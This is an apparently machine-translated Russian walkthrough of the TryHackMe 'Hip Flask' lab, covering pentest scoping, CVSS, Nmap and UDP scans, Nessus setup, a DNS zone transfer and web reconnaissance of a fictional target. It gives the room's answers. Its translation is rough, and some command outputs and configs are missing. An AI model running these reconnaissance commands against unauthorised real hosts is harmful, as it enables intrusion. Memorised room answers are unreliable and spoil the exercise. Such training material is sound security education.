[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Hip Flask](https://tryhackme.com/r/room/hipflask) 

Всего 10 заданий:
## Задание 1
Прежде чем продолжить работу с этой комнатой, разверните машину, прикрепленную к этой задаче.

Обратите внимание: для полного запуска этого устройства может потребоваться около трех минут.

### Ответьте на вопросы ниже
Коробка развернута!
```commandline
Ответ не нужен
```

## Задание 2
Hip Flask — это пошаговое руководство для начинающих и среднего уровня. Его цель — предоставить глубокий анализ 
мыслительных процессов, задействованных в атаке на уязвимый веб-сервер, на котором размещено пользовательское 
приложение, в контексте тестирования на проникновение.

В частности, в этой комнате будет рассмотрено использование приложения Python Flask с помощью двух очень характерных 
уязвимостей для удаленного выполнения кода на сервере. Затем будет выполнено простое повышение привилегий, что 
приведет к полному доступу root к цели.

Задания в этой комнате будут подробно охватывать каждый шаг процесса атаки, включая предоставление возможных 
исправлений для найденных уязвимостей. Нет никаких явных предварительных условий, которые необходимо изучить перед 
тем, как приступить к этой комнате; однако, дополнительные ресурсы будут указаны в соответствующих разделах, если вы 
захотите дальнейшей практики по рассматриваемой теме. Тем не менее, знание Python и базовых основ взлома пригодятся. 
Если сомневаетесь: исследуйте!

Firefox настоятельно рекомендуется для веб-части этой комнаты. Используйте другой браузер, если хотите, но имейте в 
виду, что все заметки по устранению неполадок будут нацелены на Firefox.

Итак, начнем.

### Ответьте на вопросы ниже
Прочитать введение
```commandline
Ответ не нужен
```

## Задание 3
Перед началом взаимодействия крайне важно, чтобы обе стороны полностью понимали, что и когда произойдет. Фактически 
это равносильно тому, что клиент предоставляет пентестеру(ам) список целей, вещей, на которые следует обратить 
внимание, вещей, которых следует избегать, и любую другую соответствующую информацию о задании. В свою очередь, 
группа оценки определит, возможно ли выполнить запрос клиента, а затем либо совместно с клиентом найдет более 
подходящий объем, либо перейдет к согласованию периода времени, когда будет проводиться тестирование. Кроме того, 
пентестеры также предоставят клиенту IP-адреса, с которых будут осуществляться атаки.

Этот процесс называется «определением области действия».

Помимо встреч по определению области действия, клиент также предоставит группе тестирования контактное лицо в 
компании. Этот человек будет работать с командой в определенной степени на протяжении всего тестирования. Во многих 
случаях это может быть просто человек, к которому можно обратиться, если что-то пойдет не так; в других случаях 
этому человеку могут предоставляться ежедневные или даже ежечасные отчеты.

Существуют различные типы тестов на проникновение и различные методологии, с помощью которых эти тесты могут быть 
выполнены. Эти методологии можно расположить на скользящей шкале между черным ящиком и белым ящиком, с серым ящиком 
посередине. В чисто черном ящике тесту на проникновение оценочной группе не будет предоставлено никакой информации о 
целях, кроме адресов или диапазона адресов для атаки. В крайних случаях злоумышленникам может быть предоставлено 
немного больше, чем название компании, и они будут вынуждены определить адреса самостоятельно. Короче говоря, 
злоумышленники начинают без предварительной информации и должны выполнить начальный подсчет для себя с той же 
стартовой позиции, что и злоумышленник (злонамеренный хакер или группа хакеров, атакующая цель без разрешения). Это 
хорошо с точки зрения реализма, однако тесты на проникновение стоят дорого, и многие компании не хотят платить 
оценщикам за то, чтобы они сидели и проводили начальный отпечаток организации.

На противоположном конце спектра находится тестирование проникновения белого ящика. Как и ожидалось, в тесте 
проникновения белого ящика злоумышленникам предоставляется вся необходимая информация о цели(ях), которую они могут 
просмотреть, чтобы найти уязвимости на основе предыдущих знаний и опыта в области безопасности.

Наиболее распространенными являются тесты серого ящика, в которых клиент предоставляет только часть релевантной 
информации. Объем раскрываемой информации зависит от клиента и цели, что означает, что тест серого ящика может 
оказаться где угодно на скользящей шкале между тестами белого и черного ящика.

Наиболее распространенными типами тестов на проникновение являются тесты на проникновение веб-приложений и сетей.

Тестирование на проникновение веб-приложений вращается (как следует из названия) вокруг поиска уязвимостей в 
веб-приложениях. В этом стиле оценки область действия будет предоставлять пентестерам веб-приложение (или несколько 
веб-приложений) для работы. В тесте на проникновение веб-приложений «белого ящика» исходный код приложения обычно 
также будет раскрыт. Затем оценщики попытаются найти уязвимости в приложении(ях) в течение определенного периода 
времени; часто следуя методологии, например, описанной в Руководстве по тестированию OWASP.
Тесты на проникновение в сеть (часто называемые тестами на проникновение в инфраструктуру) можно разделить на две 
категории: внутренние и внешние. 
Внешние сетевые пентесты — это когда клиент предоставляет конечную точку, выходящую на публичный уровень (например, 
VPN -сервер или брандмауэр), и просит пентестеров оценить ее снаружи. Если оценщикам удастся получить доступ, 
потребуется дополнительная консультация с клиентом для обсуждения расширения области действия с целью включения 
внутренних целей.
Внутренние сетевые пентесты обычно подразумевают, что пентестер физически идет к клиенту и атакует сеть с его 
территории, хотя удаленные внутренние пентесты, когда компании предоставляют пентестеру удаленный доступ к машине в 
сети (например, через VPN ), становятся все популярнее. Они относительно распространены, поскольку компании часто 
хотят протестировать свою инфраструктуру Active Directory. Этот вид оценки часто представляет собой «серый ящик» и 
начинается с позиции предполагаемого компромисса. Другими словами, злоумышленникам предоставляется учетная запись с 
низкими привилегиями, с помощью которой они могут начать рыться в сети и посмотреть, что можно использовать для 
повышения своих привилегий в домене.



Область применения этого помещения следующая:
- Есть одна цель: MACHINE_IP. Это публичный веб-сервер клиента.
- Машина является клонированной копией производственного сервера клиента. Каждая служба, запущенная на машине, 
  находится в области действия.
- Цель размещается клиентом в его штаб-квартире. Цель полностью принадлежит клиенту. Клиент имеет необходимые 
  полномочия для заказа тестирования цели.
- Никакой дополнительной информации о цели предоставлено не будет.
Оценщики должны попытаться найти все уязвимости на сервере, а затем сообщить об этом клиенту: Hip Flasks Ltd.


Заказчик — компания «Hip Flasks Ltd».

Примечание: эта компания вымышленная и не должна иметь никакого сходства с реальными организациями сейчас или в 
будущем. Все, что не входит в сеть TryHackMe, абсолютно не входит в сферу действия.

### Ответьте на вопросы ниже
Мы знаем, что атакуем веб-сервер, однако в зону действия попадает весь сервер (а не только порты 80 и 443), что 
фактически делает этот процесс гибридом между тестированием сети и тестированием веб-приложения на проникновение.

Является ли сетевая часть внутренней или внешней?
```commandline
External
```

## Задание 4
Когда в цели обнаружена уязвимость, должен быть стандартизированный способ оценки и определения серьезности 
уязвимостей. Подсказка: CVSS. 

Система оценки уязвимостей C ommon V ulnerability S ocing S ystem — это открытая структура, изначально разработанная 
Национальным консультативным советом по инфраструктуре США (NIAC). С тех пор она перешла в ведение Форума групп 
реагирования на инциденты и обеспечения безопасности (FIRST); глобального объединения, которое поддерживает систему 
с 2005 года. Коротко говоря, система оценки CVSS дает нам общий метод расчета оценок уязвимостей, которыми мы затем 
можем поделиться с клиентом. На момент написания статьи мы используем версию 3.1 системы оценки.

Система работает, предоставляя оценщику различные варианты действий с воздействием (работа с триадой ЦРУ : 
конфиденциальность , целостность и доступность ) и доступностью эксплойта (т. е. насколько легко его реализовать), 
которые затем используются для расчета базовой оценки. Когда дело доходит до CVE ( общие уязвимости и уязвимости ) — 
один из основных стандартизированных способов раскрытия уязвимостей , обнаруженных в нестандартном программном 
обеспечении и устройствах — окончательная оценка корректируется с течением времени в зависимости от других факторов, 
таких как наличие общедоступного кода эксплойта и наличие выпущенных исправлений для эксплойта. Это называется 
временной оценкой. Эксплойты в пользовательских приложениях, как правило, немного более непредсказуемы с этой 
системой оценки, однако для них все еще вполне возможно использовать CVSS.

Калькулятор доступен здесь — он использовался для расчета оценок уязвимостей, продемонстрированных в этой комнате.

Диапазон оценок CVSS составляет от 0,0 до 10,0. В следующей таблице указана степень серьезности каждого диапазона 
оценок в соответствии со спецификацией CVSSv3:
- Информационный	0
- Низкий	0,1 - 3,9
- Середина	4.0 - 6.9
- Высокий	7.0 - 8.9
- Критический	9.0 - 10.0
Эти оценки серьезности будут использоваться в разделах уязвимости этой комнаты.

Кроме того, каждой найденной уязвимости оценщики могут присвоить произвольный идентификатор, чтобы помочь со 
ссылками в отчете. В этой комнате формат идентификатора будет HF-VULN_MEDIUM-NUMBER, например, HF-NW-1относится к 
первой найденной сетевой уязвимости.

Система CVSS гораздо более обширна, чем мы рассмотрим здесь, просто потому, что для глубокого изучения того, как 
работают вычисления, потребуется целая комната (или часовая лекция). Тем не менее, настоятельно рекомендуется 
прочитать спецификацию CVSSv3 , так как она полностью объясняет внутреннюю работу системы.

### Ответьте на вопросы ниже
Прочитать обзор CVSS
```commandline
Ответ не нужен
```

## Задание 5
Когда масштаб мероприятия уже распланирован, настал день сражения!

Пришло время начать тестирование. В хакерстве (как и во всем) информация — это сила. Чем больше мы знаем о цели, тем 
больше у нас возможностей; поэтому мы начинаем с различных видов перечисления.

Мы часто начинаем с пассивного этапа футпринтинга, прежде чем начинать активный подсчет, с которым вы, возможно, 
знакомы. Это время, потраченное на сбор OSINT ( Open - Source Int elligence) о цели из ее онлайн-следа. Например, мы 
можем искать общедоступные адреса электронной почты, имена сотрудников, интересные поддомены/подкаталоги на 
веб-сайтах, репозитории Github или что-либо еще, что находится в открытом доступе и может пригодиться. Для этого 
могут пригодиться такие инструменты, как TheHarvester и фреймворк Recon-ng.

Если бы эта комната была спроектирована как полноценный курс, то была бы общедоступная информация, которую можно 
было бы найти для нашей вымышленной целевой компании; однако, поскольку это всего лишь пробный вариант методологии 
(и более глубокое введение в некоторые из методов позже!), мы пропустим этап футпринтинга и предположим, что нет 
общедоступного футпринта, который можно было бы найти. Вместо этого мы начнем с непосредственного перечисления 
целевого сервера.

К счастью, у нас только одна цель, поэтому получить начальное представление о том, с чем мы имеем дело, технически 
говоря, должно быть довольно просто. Мы начнем с нескольких сканирований портов на цели, чтобы увидеть, с чем мы 
имеем дело, затем перейдем к более проверочным сканированиям уязвимостей, после чего подробно перечислим доступные 
службы.

### Ответьте на вопросы ниже
Прочитать обзор перечисления
```commandline
Ответ не нужен
```
## Задание 6
Если вы уже выполнили хотя бы один из пунктов на TryHackMe, то вы уже должны быть знакомы со сканированием портов.

Что вам может быть менее комфортно, так это безопасное сканирование портов . В CTF слишком часто можно увидеть людей,
запускающих Rustscan или nmap с активными переключателями -T5 и/или -A. Это все хорошо и хорошо в лабораторной среде, 
но вряд ли будет хорошо работать в реальном мире. В действительности быстрое и яростное перечисление с гораздо 
большей вероятностью нанесет ненужный ущерб цели (можно сказать, что если сервер не может противостоять сканеру 
портов, то он не подходит для этой цели, но вы действительно хотите объяснять клиенту и своему боссу, почему 
веб-сайт компании упал?). На ум приходит мантра «тише едешь — дальше будешь». Реалистично, в современном мире все, 
кроме маленького, медленного, самодельного сканера портов, будет очень быстро обнаружено большинством систем 
обнаружения вторжений; однако мы также можем минимизировать свой собственный след, насколько это возможно.

Быстрое сканирование с небольшой областью действия может использоваться для получения первоначального представления 
о том, что доступно. Более медленное сканирование с большей областью действия может затем выполняться в фоновом 
режиме, пока вы изучаете результаты начальных сканирований. Цель должна заключаться в том, чтобы всегда иметь что-то 
работающее в фоновом режиме, пока вы сосредоточены на чем-то другом (философия, которая не должна применяться только 
к начальному перечислению).

Имея это в виду, давайте начнем сканирование цели. Если вы еще не знакомы с Nmap, сейчас самое время закончить 
комнату Nmap .

Прежде чем начать сканирование, попробуйте пинговать цель. Вы должны обнаружить, что она не отвечает на эхо-пакеты 
ICMP (т.е. пинги по ней выходят за рамки тайм-аута):

Результаты ICMP
pentester@attacker:~ $ `ping -c MACHINE_IP `
PING MACHINE_IP ( MACHINE_IP ) 56(84) байт данных.

--- Статистика пинга MACHINE_IP ---
5 пакетов передано, 0 получено, 100% потеря пакетов, время 4094 мс
Мы знаем, что цель активна, поэтому это говорит нам о том, что между нами и целью существует защитная стена — вывод, 
который стоит иметь в виду по мере продолжения оценки.

Пришло время для сканирования Nmap .

Прежде всего, давайте сделаем быстрое сканирование TCP SYN для 1000 самых распространенных портов TCP на цели. Если 
вы еще не работаете как root, мы сделаем это, sudoчтобы иметь возможность использовать сканирование SYN "Stealth" 
(которое является стандартным для пользователя root):
`sudo nmap -vv MACHINE_IP -oN Initial-SYN-Scan`

Мы используем -oN для записи результатов этого в файл в обычном формате. Хорошей практикой является всегда сохранять 
результаты наших сканирований — это означает, что мы можем ссылаться на них позже, и нам никогда не придется 
повторять сканирование. 

Для достижения этой цели мы должны получить четыре возвращенных порта:

`pentester@attacker:~ $ sudo nmap -vv MACHINE_IP -oN Начальное-SYN-сканирование`
Из них 22, 80 и 443 являются общими для веб-сервера Linux . DNS на TCP/53 интересен. Это указывает на то, что на 
хосте также работает DNS-сервер — вероятно, авторитетный сервер имен для домена. DNS на TCP-порту 53 используется 
для передачи зон и в качестве резервного, если DNS-запросы к UDP /53 не будут выполнены. Другими словами, мы также 
можем ожидать, что UDP /53 будет открыт.

Далее давайте выполним сканирование служб на этих четырех портах, просто чтобы убедиться, что мы правы со службами:

Результаты сканирования сервиса
`pentester@attacker:~ $ sudo nmap -p 22,53,80,443 -sV -Pn -vv MACHINE_IP -oN service-scan`

С помощью сканирования сервиса мы идентифицировали OpenSSH версии 8.2p1 для Ubuntu. Проверка списка пакетов Ubuntu 
показывает, что эта версия в настоящее время поставляется только с Ubuntu Focal — другими словами, Ubuntu 20.04 LTS. 
Хотя этот отпечаток технически может быть подделан, его стоит записать, так как вероятность этого невелика.

Порт 53 явно имел поддельный отпечаток — это легко сделать, и часто это делается в попытке скрыть версию сервиса. 
Учитывая, что мы знаем, что эта машина, скорее всего, будет Linux, мы можем предположить, что установленный 
DNS-сервер, скорее всего (статистически говоря), будет BIND (B erkeley I nternet Name D omain ) . Если это так , то 
(несмотря на отсутствие точного отпечатка) мы также можем сделать вывод, что версия сервера — не ниже 8.2, поскольку 
именно тогда была введена возможность изменения баннера. Это прискорбно, поскольку до этого момента в этом 
программном обеспечении также было несколько серьезных уязвимостей.

Определение веб-сервера как Nginx не сильно нам поможет, но, опять же, полезно это записать.

У нас уже есть довольно хорошее представление о том, что может происходить с этим сервером. Хотя многое из того, что 
мы только что рассмотрели, является догадками, основанными на наиболее распространенных развертываниях программного 
обеспечения, все равно полезно предварительно зафиксировать это как рабочую точку, которую можно будет изменить, 
если она в дальнейшем будет противоречить.

Далее давайте выполним UDP-сканирование на цели. UDP-сканирование печально известно своей медлительностью, 
неточностью и непоследовательностью, поэтому мы не будем тратить на это много времени. Мы хотим подтвердить, что 
порт 53 открыт, поэтому давайте скажем Nmap просканировать 50 самых распространенных UDP- портов и сообщить нам, 
какие из них, по его мнению, открыты.

Мы получаем четыре результата, только один из которых является окончательным:

`pentester@attacker:~ $ sudo nmap -sU --top-ports 50 -Pn -vv --open   MACHINE_IP -oN udp-top-ports`

Подобно filtered ответу от сканирования TCP, ссылающегося на работающий брандмауэр, open|filtered ответ при 
сканировании UDP указывает на возможный брандмауэр. Как показывает сканирование, три порта, показывающие это 
состояние, не дали ответа на сканирование. Это может означать, что есть брандмауэр, препятствующий доступу к портам, 
или это может означать, что порты открыты и просто не возвращают ответ (как это часто бывает с UDP ). Короче говоря, 
сканирования UDP не очень точны, но мы подтвердили, что UDP /53 открыт.    

Подводя итог, на основании первоначальной информации мы точно знаем, что запущены три службы: SSH на TCP-порту 22, 
DNS на TCP- и UDP-портах 53 (с измененным баннером) и HTTP (S) на TCP -портах 80 и 443.

На данный момент этого достаточно, чтобы продолжить.

Мы продолжим отсюда; однако, как правило, вам следует запустить полное сканирование портов в более медленном режиме 
(например, -T2) для портов TCP, и, возможно, немного более широкое сканирование UDP в фоновом режиме. Будьте 
осторожны: они не вернут ничего нового для этого ящика.

### Ответьте на вопросы ниже
Убедитесь, что вам удобны услуги, предлагаемые этой целью.
```commandline
Ответ не нужен
```

## Задание 7
Завершив первоначальный перечень, давайте рассмотрим сканирование уязвимостей.

Мы могли бы продолжать использовать для этого Nmap (используя NSE — N map S cripting Engine ); или мы могли бы 
поступить более привычно и перейти на стандартный сканер уязвимостей: Nessus.

Сканеры уязвимостей используются для сканирования цели (или, как правило, широкого спектра целей в клиентской сети), 
проверяя уязвимости по центральной базе данных. Обычно они предоставляют список обнаруженных уязвимостей, 
ранжированных от критических до низких или информационных, с опциями фильтрации результатов и экспорта их в отчет. 
Существует множество доступных сканеров уязвимостей, включая фреймворк OpenVAS с открытым исходным кодом , однако 
Nessus является одним из самых популярных сканеров уязвимостей, доступных в настоящее время, когда речь идет об 
использовании в отрасли. И OpenVas, и Nessus уже имеют комнаты TryHackMe, посвященные им, поэтому мы сделаем этот 
раздел относительно коротким.

К сожалению, из-за лицензирования невозможно предоставить машину с предустановленным Nessus. Если вы хотите 
следовать этому разделу, вам нужно будет загрузить и установить Nessus Essentials (бесплатную версию) для себя. Это 
относительно простой процесс (который подробно описан в комнате Nessus ) , однако он может занять довольно много 
времени! Nessus Essentials значительно ограничивает вас по сравнению с очень дорогими профессиональными версиями; 
однако для наших целей этого будет достаточно. Эта задача не является обязательной для завершения комнаты, поэтому 
не стесняйтесь просто прочитать информацию здесь, если вы предпочитаете не следовать самостоятельно.

Краткая версия процесса установки:
- Создайте новую Ubuntu VM (настольную или серверную, или полностью другой дистрибутив). 40 ГБ места на жестком диске, 4 ГБ ОЗУ и 2 VCPU хорошо работают локально; однако вы, вероятно, могли бы обойтись немного меньшей вычислительной мощностью для того, для чего мы используем Nessus здесь. Полный список официальных требований к оборудованию подробно описан здесь , хотя, опять же, они предполагают, что вы используете Nessus профессионально.
- После установки виртуальной машины перейдите на страницу загрузок Nessus и скачайте подходящий установщик. Для 
  Ubuntu, Debian или любых других производных Debian вам нужно найти .debфайл, который соответствует вашей версии виртуальной машины (поиск на странице имени и версии виртуальной машины — например, «Ubuntu 20.04» — может быть эффективным). Прочитайте и примите лицензионное соглашение, затем загрузите файл на свою виртуальную машину .
- Откройте терминал и перейдите туда, куда вы скачали пакет. Установите его с помощью sudo apt install ./PACKAGE_NAME.
- Это должно установить сервер Nessus. Вам нужно будет запустить сервер вручную; это можно сделать с помощью: sudo 
  systemctl enable --now nessusd. Это навсегда включит демон Nessus, позволяя ему запускаться с виртуальной машиной , открывая веб-интерфейс на https://LOCAL_VM_IP:8834.
- Перейдите в веб-интерфейс и следуйте инструкциям, не забудьте выбрать Nessus Essentials, когда вас попросят указать 
  версию. Вам понадобится (бесплатный) код активации для использования сервера; он должен быть отправлен по электронной почте непосредственно с веб-интерфейса сервера. Если это не сработает, вы можете вручную получить код активации здесь .
- Дайте программе некоторое время на завершение настройки, затем при появлении соответствующего запроса создайте имя 
  пользователя и пароль и войдите в систему!
У нас уже есть цель с 5 подтвержденными открытыми портами, так что давайте начнем ее сканировать!

Перед настройкой сканирования убедитесь, что ваша виртуальная машина Nessus подключена к сети TryHackMe либо с 
помощью собственного файла конфигурации VPN (без подключения к другим машинам), либо с помощью отдельного файла 
конфигурации из другой учетной записи.

После этого можно приступать к сканированию.

Нажатие «Новое сканирование» в правом верхнем углу приводит нас к интерфейсу «Шаблоны сканирования». Отсюда мы 
выбираем «Расширенное сканирование»:


Введите имя и описание по вашему выбору, затем добавьте IP-адрес цели ( MACHINE_IP) в список целей:
Демонстрация заполнения общих настроек для расширенного сканирования

После установки цели переключите вкладки на Discovery -> Host Discovery в меню Settings для сканирования и отключите 
опцию "Ping the remote host". Как было установлено ранее, эта машина не отвечает на пакеты ICMP echo, поэтому нет 
смысла пинговать ее, чтобы проверить, работает ли она.

Далее мы переходим в Discovery -> Port Scanning в меню Settings для сканирования. Здесь мы можем указать Nessus 
сканировать только те порты, которые мы уже обнаружили открытыми:
- Изображение, показывающее, как настроить диапазон портов для использования портов, которые были обнаружены 
открытыми в предыдущих задачах
- Внизу страницы мы теперь можем выбрать сохранение (или прямой запуск) сканирования. Щелкните раскрывающийся список 
  справа от кнопки «Сохранить» и запустите сканирование.
- Сканирование займет несколько минут и (на момент написания) вернет две средние уязвимости, одну низкую уязвимость 
  и 42 раскрытия информации. Нажав на имя сканирования в интерфейсе «Мои сканирования», мы получим обзор результатов:
Изображение, показывающее результаты сканирования

Как это часто бывает, ни один из выводов не является особенно полезным для нас с точки зрения дальнейшей 
эксплуатации цели (обе уязвимости среднего уровня связаны с самоподписанным SSL-сертификатом для сервера, а низкая 
уязвимость относится к слабому шифру, включенному в SSH ); однако, они определенно заслуживают того, чтобы о них 
сообщили клиенту. Обратите внимание, что оценки даны на основе системы CVSSv3.

Мы могли бы запустить несколько более целенаправленных сканирований, но в остальном мы уже сделали все, что могли с 
Nessus на данном этапе. Это может пригодиться позже, если мы найдем какие-либо учетные данные SSH.

### Ответьте на вопросы ниже
Прочитайте введение Nessus
```commandline
Ответ не нужен
```

## Задание 8
Из трех доступных сервисов веб-сервер, скорее всего, имеет уязвимости, которые Nessus не смог найти. Поскольку 
клиент не просил нас сосредоточиться конкретно на веб-приложении, а на сервере в целом, мы не будем проводить 
глубокий анализ веб-сайта(ов), обслуживаемого веб-сервером. Мы всегда можем обсудить добавление полного пентеста 
веб-приложения в область действия с клиентом позже.

Nginx легко неправильно настроить, и любые пользовательские веб-приложения на сервере могут потенциально иметь 
уязвимости, которые Nessus не сможет обнаружить. На данный момент мы не знаем, используется ли Nginx в качестве 
обратного прокси-сервера или установлен и включен ли его PHP- движок.

Есть только один способ узнать!

При переходе по целевому IP-адресу в Firefox мы получаем сообщение:

Host Name: MACHINE_IP, not found.
This server hosts sites on the hipflasks.thm domain.
Это одинаково для обеих версий страницы: HTTP и HTTPS.

Помимо слишком подробного сообщения об ошибке (которое само по себе является ненужным раскрытием информации и должно 
быть исправлено), мы также узнаем, что домен клиента, по-видимому, hipflasks.thm. Это то, что мы, вероятно, уже 
знали бы, если бы мы отследили клиента до начала оценки. Кроме того, теперь мы знаем, что сервер ожидает 
предоставления определенного имени сервера — вероятно, hipflasks.thm или его поддомена.

Тестирование общих поддоменов значительно осложняется тем фактом, что это не совсем публичный веб-сервер. Обычным 
решением в CTF было бы просто использовать файл /etc/hostsв системах Unix или  
C:\Windows\System32\drivers\etc\hostsфайл в Windows, но это станет колоссальной головной болью, если на цели много 
виртуальных хостов. Вместо этого давайте воспользуемся DNS - сервером, установленным на цели.

Редактирование системных DNS-серверов для VPN-подключения с раздельным туннелем, как в TryHackMe, честно говоря, 
колоссальная боль в задней части. К счастью, есть более простая версия "хака", использующая настройки конфигурации 
FireFox. Это позволит FireFox использовать только DNS-сервер, но сейчас это все, что нам нужно.

Перейдите по адресу about:configв строке поиска FireFox и примите уведомление о рисках.
Найдите network.dns.forceResolve, дважды щелкните по нему и установите значение IP-адреса целевой машины, затем 
щелкните кнопку с галочкой, чтобы сохранить настройку:
Снимок экрана, показывающий настройку network.dns.forceResolve в Firefox после установки
Примечание: вам нужно будет заменить его на IP-адрес вашей машины!
Теперь мы должны иметь возможность получить доступ ко всему на hipflasks.thm домене через FireFox. К сожалению, 
общие поддомены, такие как, wwwпохоже, не настроены для домена, поэтому нам остается либо искать vhosts, либо 
возиться с DNS- сервером. 

Раскрытие ненужной информации на целевой странице сервера Nginx.	Удалите последнее предложение из 
пользовательского сообщения об ошибке, чтобы отображалось только сообщение «Имя хоста не найдено».
### Ответьте на вопросы ниже
Прочитайте начальные мысли по веб-приложению и убедитесь, что вы можете получить доступ к серверу, используя любое 
имя хоста (следуя инструкциям в задании), прежде чем двигаться дальше.
```commandline
Ответ не нужен
```

## Задание 9
Мы до сих пор не знаем точно, какой именно DNS-сервер здесь используется; однако в настоящее время в DNS-серверах 
Linux очень мало уязвимостей, поэтому есть вероятность, что если что-то и будет обнаружено, то это будет 
неправильная конфигурация.

К счастью для нас, неправильные настройки DNS, как известно, легко допустить.

Как адресная система Интернета, не нужно говорить, насколько важна DNS . В результате этой важности хорошей 
практикой является наличие по крайней мере двух DNS-серверов, содержащих записи для «зоны» (или домена, в обычных 
терминах). Это означает, что если один сервер выйдет из строя, останется по крайней мере один другой, содержащий 
записи для домена; но это создает проблему: как обновить DNS-записи для зоны, не обновляя каждый сервер вручную? 
Ответом является то, что называется «передача зоны». Короче говоря: один сервер настраивается как «главный» (или 
основной) DNS- сервер. Этот сервер содержит основные записи для зоны. В BIND9 файлы конфигурации зоны для основного 

Это определяет главную зону для домена example.com, это говорит BIND читать записи из файла с именем /etc/bind/db.
examples.comи принимать запросы из любого места. Что важно, это также позволяет переносить зоны на IP-адрес: 172.16.0.2. 

В дополнение к основному DNS-серверу настраиваются один или несколько "ведомых" (или вторичных) DNS- серверов. Они 
будут иметь файл зоны, выглядящий следующим образом:
 
Это определяет подчиненную зону, устанавливая IP-адрес основного DNS- сервера в masters {};директиве.


Итак, что такое переносы зон? Как вы могли догадаться, переносы зон позволяют вторичным DNS- серверам реплицировать 
записи для зоны с первичного DNS- сервера. С частыми интервалами (контролируемыми значением времени жизни зоны) 
вторичный сервер(ы) будет запрашивать серийный номер для зоны с первичного сервера. Если номер больше, чем номер, 
который вторичный сервер(ы) сохранил(и) для зоны, то они инициируют перенос зоны, запрашивая все записи, которые 
первичный сервер хранит для этой зоны, и делая локальную копию.
В некоторых конфигурациях на первичном DNS- сервере может также существовать «Список уведомлений DNS» . Если он есть,
то первичный сервер будет уведомлять все вторичные серверы всякий раз, когда вносятся изменения, инструктируя их о 
необходимости запроса на передачу зоны.

Как мы можем использовать это в качестве оружия? Ну, а что произойдет, если какой-либо из серверов не укажет, каким 
IP-адресам разрешено запрашивать передачу зоны? Что, если DNS- сервер имеет запись в конфигурации зоны, которая 
выглядит так: allow-transfer { any; };?

Вместо указания конкретного IP-адреса (или набора IP-адресов) сервер позволяет любой удаленной машине запрашивать 
все записи для зоны. Хотите верьте, хотите нет, но эту неправильную конфигурацию еще проще сделать в диспетчере 
служб DNS Windows GUI.

Это означает, что если сервер настроен неправильно, мы можем получить дамп каждой записи для домена, включая 
поддомены, которые мы здесь ищем!

Зонные передачи инициируются путем отправки запроса на целевой DNS- сервер axfr. Это можно сделать разными способами, однако в Linux проще всего использовать команды digили host:
`dig axfr hipflasks.thm @MACHINE_IP`
или
`host -t axfr hipflasks.thm MACHINE_IP`

Если сервер неправильно настроен на разрешение передачи зон из неподходящих мест, то обе эти команды вернут 
одинаковые результаты, хотя и немного по-разному отформатированные. А именно, дамп каждой записи в зоне.

### Ответьте на вопросы ниже
Попытайтесь выполнить перенос зоны для hipflasks.thmдомена.

На каком поддомене размещено веб-приложение, которое мы ищем?
```commandline
hipper
```

## Задание 10
Ранее мы уже изменили нашу конфигурацию FireFox, чтобы направить весь наш трафик на цель, поэтому мы уже должны иметь возможность получить доступ к этому сайту на https://hipper.hipflasks.thm. Тем не менее, изменение конфигурации, которое мы сделали ранее (хотя оно очень хорошо для работы с неизвестным веб-сервером), может очень быстро стать раздражающим, поэтому сейчас, возможно, самое время отменить его и просто добавить hipper.hipflasks.thmв свой файл hosts.

Примечание: поскольку эта цель фактически не подключена к Интернету, вам необходимо будет принять самоподписанный сертификат, выбрав «Дополнительно» -> «Принять» на всплывающей странице предупреждения.

Домашняя страница сайта

Осмотрев страницу и исходный код, мы не видим рабочих ссылок, поэтому, если мы хотим получить доступ к другим страницам, нам придется искать их самостоятельно. Конечно, листинг каталогов отключен, что немного усложняет задачу.

Исходный код указывает на наличие подкаталогов assets/, assets/img/, css/и js/, которые, по-видимому, содержат все статические ресурсы, используемые на странице:

```commandline
индекс.html
---
        <link rel="icon" type="image/x-icon" href=" assets/ favicon.ico" />
        <!-- Значки Font Awesome (бесплатная версия)-->
        <script src=" js/ fa-all.js" crossorigin="anonymous"></script>
        <!-- Шрифты Google-->
        <link href=" css/ railway.css" rel="таблица стилей" />
---
            <div class="контейнер">
                <div class="intro">
                    <img class="intro-img img-fluid mb-3 mb-lg-0 rounded" src=" assets/img/ flask.jpg" alt="..." />
---
```
Просмотрев некоторые таблицы стилей шрифтов, можно обнаружить, что там также есть assets/fonts/подкаталог. Например, в css/railway.css:


Пока ничего новаторского, но мы можем начать создавать карту приложения на основе того, что у него есть:
```commandline
/
|__assets/
|____imgs/
|____fonts/
|__css/
|__js/
```

После первоначального осмотра давайте взглянем на сам сервер. Расширение браузера Wappalyzer — хороший способ сделать это, или, в качестве альтернативы, мы могли бы просто посмотреть заголовки сервера либо в инструментах разработчика браузера, либо в Burpsuite. Перехватывая запрос https://hipper.hipflasks.thm/в Burpsuite, мы можем щелкнуть правой кнопкой мыши и выбрать Do Intercept -> Response to this request:
Демонстрация выбора запроса перехвата Burpsuite

Теперь мы должны получить заголовки ответа от сервера:

Заголовки ответа сервера
```commandline
HTTP/1.1 200 OK
Date: Sat, 26 Jun 2021 15:10:50 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Server: waitress
Vary: Cookie
Front-End-Https: on
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Content-Length: 3608
```
Здесь выделяется несколько вещей. Прежде всего, заголовок сервера: . Обычноwaitress это Nginx, так как мы уже знаем из отпечатка TCP, что это используемый веб-сервер. Это означает, что мы имеем дело с обратным прокси-сервером к серверу waitress. Быстрый поиск в Google по запросу «waitress web app» говорит нам, что Waitress — это готовый к производству сервер Python WSGI — другими словами, мы, скорее всего, имеем дело либо с Django, либо с веб-приложением Flask, которые являются самыми популярными фреймворками веб-разработки Python.

Во-вторых, здесь задействованы различные заголовки безопасности, однако, следует отметить отсутствие заголовков Content-Security-Policyи , что означает, что сайт может быть уязвим для XSS , если мы найдем подходящее поле ввода. Аналогично, заголовок HSTS ( H ttp S trict Transport S ecurity ) , который обычно должен принудительно устанавливать соединение HTTPS, на самом деле ничего здесь не сделает из-за самоподписанного сертификата.X-XSS-Protection

Прежде чем двигаться дальше, давайте запустим пару сканирований в фоновом режиме, пока мы будем осматриваться вручную. В частности, давайте выберем Nikto и Feroxbuster (или Gobuster , если вам так больше нравится). Работаем параллельно (предполагая, что вы обновили файл hosts):
`nikto --url https://hipper.hipflasks.thm | tee nikto`
и
`feroxbuster -t 10 -u https://hipper.hipflasks.thm -k -w /usr/share/seclists/Discovery/Web-Content/common.txt -x py,html,txt -o feroxbuster`

